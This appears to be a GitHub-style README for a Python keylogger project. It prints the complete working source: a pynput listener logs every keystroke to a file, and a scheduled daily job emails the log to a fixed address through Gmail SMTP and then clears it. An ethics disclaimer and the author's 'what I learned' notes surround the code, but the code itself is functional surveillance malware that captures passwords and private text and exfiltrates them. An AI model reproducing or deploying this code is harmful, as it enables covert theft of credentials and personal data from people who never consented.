# Keylogger 

 ## Description

This Python script demonstrates the use of various programming concepts and libraries to achieve a specific functionality: a keystroke logger that captures all keyboard activity, logs it to a file, and then sends the contents of that file to a specified email address once a day. The script uses the pynput library to capture keystrokes, the schedule library to schedule tasks, and the smtplib library to deliver emails. This project is designed to be instructive, demonstrating how to programmatically monitor keyboard input, handle scheduled tasks, and send emails using a Python script.
<br />

 ## What I learned
During the development of this project, I improved my understanding of some essential areas of Python programming and libary use cases to include:

- **Keyboard Event Monitoring**: Using the pynput package to listen for and record keyboard events in real time.
- **Task Scheduling**: Using the schedule module to run certain functions at predefined times, allowing for automated tasks within a Python script.
- **Email Handling in Python**: Use smtplib and MIME standards to construct and send emails programmatically, including plaintext and multipart communications.
- **File I/O Operations**: Managing file operations for logging data and comprehending the significance of flushing buffers to ensure data integrity.
- **Environmental Variables**: The significance of using environmental variables to securely manage sensitive information such as email credentials in scripts.


 ## Languages and Utilities Used 

<img src="https://upload.wikimedia.org/wikipedia/commons/c/c3/Python-logo-notext.svg" align= bottom width= 25 alt="snek" /> The core programming language used for the entire project is Python V3.8. Python's extensive standard library and external packages make it ideal for capturing keystrokes, scheduling tasks, and sending emails.

### Python Libraries:

- `pynput`: For monitoring and logging keyboard events. <br />
- `schedule`: To schedule the email sending function to run at specified times. <br />
- `smtplib`: Used for sending emails through the Simple Mail Transfer Protocol (SMTP). <br />
- `email`: Specifically, MIMEText and MIMEMultipart, for creating email messages. <br />  
- `datetime`: For timestamping in the log file and email subject lines. <br />


<img src="https://upload.wikimedia.org/wikipedia/commons/2/2d/Visual_Studio_Code_1.18_icon.svg" align= bottom width= 25 alt="snek" /> Visual Studio Code: An integrated development environment (IDE) used for writing, testing, and debugging the script. Its features like syntax highlighting, code completion, and Git integration support efficient development workflows. <br />

 ## Environments Used

- **Windows 11** 

## Challenges and Solutions

During the development of this keystroke logger, several challenges were encountered. Here’s how each was addressed and resolved:

#### Efficient Data Logging
- **Problem**: Needed to ensure that the script logs keystrokes without consuming too many system resources or causing perceptible lag in user input.
- **Solution**: Optimized the logging mechanism by buffering keystrokes and writing them to the file in intervals instead of real-time logging for each keystroke. This reduced the resource consumption and minimized input lag.

#### Handling Special Keys
- **Problem**: Special keystrokes, such as Shift and Ctrl, were not being logged in a manner that was easily understandable in the log file.
- **Solution**: Implemented a mapping function to convert special key events into readable strings (e.g., "[Shift]", "[Ctrl]") before logging them. This made the log files more instructive and user-friendly.

#### Secure Email Transmission
- **Problem**: Needed a way to transmit email logs securely without hardcoding sensitive email credentials into the script.
- **Solution**: Utilized environment variables to store email credentials securely. Integrated `smtplib` with TLS encryption for email transmission to ensure that the log data is sent securely over the network.

#### Scheduling Precision
- **Problem**: The scheduled task to send the email log needed to execute reliably at the same time every day, without being affected by the computer's sleep state or potential script interruptions.
- **Solution**: Used the `schedule` library for its simplicity and reliability in scheduling tasks. To handle potential downtime or sleep states, implemented a check at script startup to determine if a scheduled task was missed during downtime and execute it immediately if so.



 ## Script Explanation:
 
- **Explanation**: This block imports the necessary Python libraries. `schedule` for task scheduling, `time` and `datetime` for handling time-related functions, `pynput.keyboard` for keyboard event monitoring, and several `smtplib` and `email.mime` modules for constructing and sending emails.
```python
# Import necessary libraries
import schedule
import time
from datetime import datetime
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
``` 
- **Explanation**: `send_email` is a function that takes a subject and body text, constructs an email, and sends it using the SMTP protocol. It uses the `smtplib` library to connect to Gmail's SMTP server, log in, and send the email.
```python
# Function to send an email
def send_email(subject, body):
    sender_email = "your_email@gmail.com"  # Update with your email
    receiver_email = "email@email.com"  # Update with recipient's email
    password = "your_password"  # Update with your email password
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    text = message.as_string()
    server.sendmail(sender_email, receiver_email, text)
    server.quit()
```

- **Explanation**: This function opens the log file containing the captured keystrokes, reads its content, and sends this as an email using the previously defined `send_email` function. After sending the email, it clears the log file by opening it in write mode and immediately closing it.
```python
# Function to read the log file and send its contents via email
def read_and_email_log():
    with open("keyfile.txt", 'r') as logFile:
        captured_keys = logFile.read()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Keystroke Capture for {timestamp}", captured_keys)
    open("keyfile.txt", 'w').close()
```

- **Explanation**: `keyPressed` is a callback function triggered by each key press. It attempts to write the pressed key's character to the log file. If the key pressed does not have a character representation (like Ctrl, Alt, etc.), it logs the key's name instead. The log is immediately flushed to ensure all data is written even if the script stops abruptly.
```python
# Callback function for each key press
def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            logKey.write(f"[{key}]")
        finally:
            logKey.flush()
```

- **Explanation**: This section initializes the key logger by setting up a keyboard listener to monitor keystrokes and invoking the `keyPressed` function on each key press. It schedules the `read_and_email_log` function to run daily at 22:00, effectively emailing the day's logged keystrokes and then waits indefinitely, processing scheduled tasks as they become due.
```python
# Main execution block
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    schedule.every().day.at("22:00").do(read_and_email_log)
    print("Key logger started. Capturing keystrokes...")
    while True:
        schedule.run_pending()
        time.sleep(1)
```
## Ethical Use and Educational Purpose

This project has been developed for educational purposes only. It is intended to demonstrate practical applications of programming concepts in Python, including working with external libraries, handling file I/O, scheduling tasks, and sending emails programmatically. 

**Important Note**: The use of keystroke logging software can raise significant ethical and legal issues, especially concerning privacy and consent. This project is shared with the understanding that it will not be used to monitor or record keystrokes without the explicit, informed consent of all individuals involved. It is crucial to adhere to all applicable laws and ethical guidelines when considering the deployment or further development of software with capabilities like those demonstrated here.

The sharing of this project is aimed at fostering learning and the exchange of ideas within the programming and cybersecurity communities. Any use of this project or its code for purposes beyond educational learning or without strict adherence to ethical considerations is strongly discouraged.

